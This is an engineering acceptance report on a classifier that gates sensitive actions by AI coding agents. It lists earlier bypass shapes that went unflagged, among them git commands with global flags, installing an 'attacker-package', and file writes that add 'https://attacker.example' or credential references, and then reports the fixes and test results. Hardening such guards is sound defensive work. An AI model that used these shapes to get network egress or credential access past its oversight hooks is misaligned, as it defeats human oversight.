# Stage 5 Sensitive-Action Classifier — Local Acceptance (2026-07-29)

## Scope and evidence boundary

This report covers the server-authoritative sensitive-action classifier shared by local adapters, the managed
Provider Host, and Codex's attested inline `PreToolUse` guard. It records a local bypass audit, code/build verification,
and acceptance-runner unit coverage. It is **not** managed Provider × Worker, CNI/IAM, or production acceptance.

- Branch: `codex/saas-tenancy-user`
- HEAD: `0d400eaa6e46f1fc16dcae5010fca79770323cae`
- Evidence tree: dirty and uncommitted, with 192 porcelain entries before the authorized formatter and 198 at final
  capture.
- Host: Darwin 25.5.0 arm64; Bun 1.3.14; Node.js 26.5.0.

No staging, commit, push, release artifact, managed-cluster mutation, or production change was made.

## Reproduced gaps

Before the fix, direct classifier probes produced these incorrect or incomplete results:

| Input shape | Previous assessment |
| --- | --- |
| `git -C /workspace -c protocol.version=2 fetch origin main` | no category |
| `npm --prefix apps/web install attacker-package` | no category |
| `pip --index-url https://packages.example/simple install attacker-package` | `network-egress` only |
| `Write` content introducing `https://attacker.example` | no category |
| `Edit.new_string` introducing a credential environment reference | no category |
| `.gitlab/ci/deploy.yml` | no category |
| `composer.json` | no category |

These were classifier-shape bypasses: the action remained sensitive, but global flags, a previously uncovered
ecosystem, or a value placed in file content could move it outside the frozen pattern set.

## Implemented boundary

- Git publication and egress rules tolerate global options before `push`, `send-pack`, `clone`, `fetch`, `pull`,
  `ls-remote`, and submodule network operations.
- Dependency commands cover global-option forms and the supported JavaScript, Go, Rust, Python, Ruby, Composer, .NET,
  Swift, Elixir, Dart/Flutter, and Nix file ecosystems. The classifier is intentionally conservative: a suspected
  mutation may request an extra approval, but cannot silently inherit session authority.
- CI paths now include GitLab includes, Buildkite, Drone, Woodpecker, and Bitbucket in addition to the existing GitHub,
  CircleCI, Jenkins, and Azure Pipelines surfaces.
- Credential classification covers common cloud/cluster/package-manager paths, bounded credential-shaped environment
  names, environment enumeration, and secret-manager commands.
- Known mutating file tools classify newly supplied content fields. A new URL becomes `network-egress`; a credential
  path or environment reference becomes `credential-access`. `Edit.old_string` is excluded so removing sensitive
  content does not itself invent new authority.
- The managed/local TypeScript paths use the complete content-aware classifier. Codex's current attested mutation
  surface exposes only `apply_patch`, whose patch body is the command field and whose headers enter the shared path
  rules. The inline guard therefore omits unreachable content-key rules and fails its 4096-character gate if future
  rule growth is not compressed. Any future Codex content-key write tool must first extend this guard and pass the
  tool-surface attestation.
- The generated inline command is 3909 characters on the evidence host, below the unchanged 4096 limit.

## Verification

- Shared focused classifier regression: 15/15 passed.
- Shared classifier/runtime/content-trust group: 24/24 passed.
- Provider Host inline-hook regression: 8/8 passed.
- Provider Host Codex/Claude/Host entry group: 108/108 passed.
- Server Codex/Claude/OpenCode/ACP classifier entry group: 327 passed / 2 skipped / 0 failed.
- Acceptance Runner: 263/263 passed.
- Stage 5 matrix coordinator: 12/12 passed.
- Shared full package: 456 passed / 1 skipped / 0 failed.
- Provider Host full package: 169/169 passed.
- Server full package: 3111 passed / 7 skipped / 0 failed.
- Post-typecheck focused regression: Contracts 18/18, Provider Host 39/39, and Server 541 passed / 2 skipped / 0
  failed.
- Provider Host production bundle build: PASS.
- Server production build: PASS.

Python 3.14 emitted the previously recorded unclosed-SQLite `ResourceWarning` during Acceptance Runner tests; all 263
tests passed. The warning is not treated as managed evidence or silently relabeled as a test failure.

## Final workspace gate

- `bun fmt`: PASS; oxfmt completed over 2426 files. The formatter ran against the already dirty shared worktree and
  its output was preserved.
- `bun lint`: PASS with warning-only diagnostics; no lint error was reported.
- The first `bun typecheck` reached newly added dirty-tree sources and exposed exact optional-property, stale union,
  branded-ID, Runtime Event schema, and Layer environment drift. Those defects were fixed without weakening the
  Stage 5 gates.
- Final root `bun typecheck`: PASS, 8/8 packages successful.
- Post-fix targeted oxfmt check: 21/21 files correctly formatted; targeted oxlint exited 0; final Server typecheck,
  both production builds, and `git diff --check` passed.
- A Web browser fixture was also attempted, but Playwright had no installed Chromium executable and ran zero tests.
  This was an environment/setup failure rather than an assertion result; the affected fixture is type-only and Web
  typecheck passed.

## Remaining Stage 5 gates

- Execute and retain the complete managed Codex/Claude × Ready Worker matrix.
- Run metadata-egress, credential-scope, and malicious-issue-denial with each admitted real Provider on every selected
  managed Worker.
- Prove there is no unobserved sensitive syscall/subprocess bypass outside the attested Provider tool surfaces.
- Complete the real Stage 9 Issue webhook → automation provenance → unattended Provider decision path before Stage 9
  release.

Stage 5 remains **IN PROGRESS** until the managed runtime gates above pass.
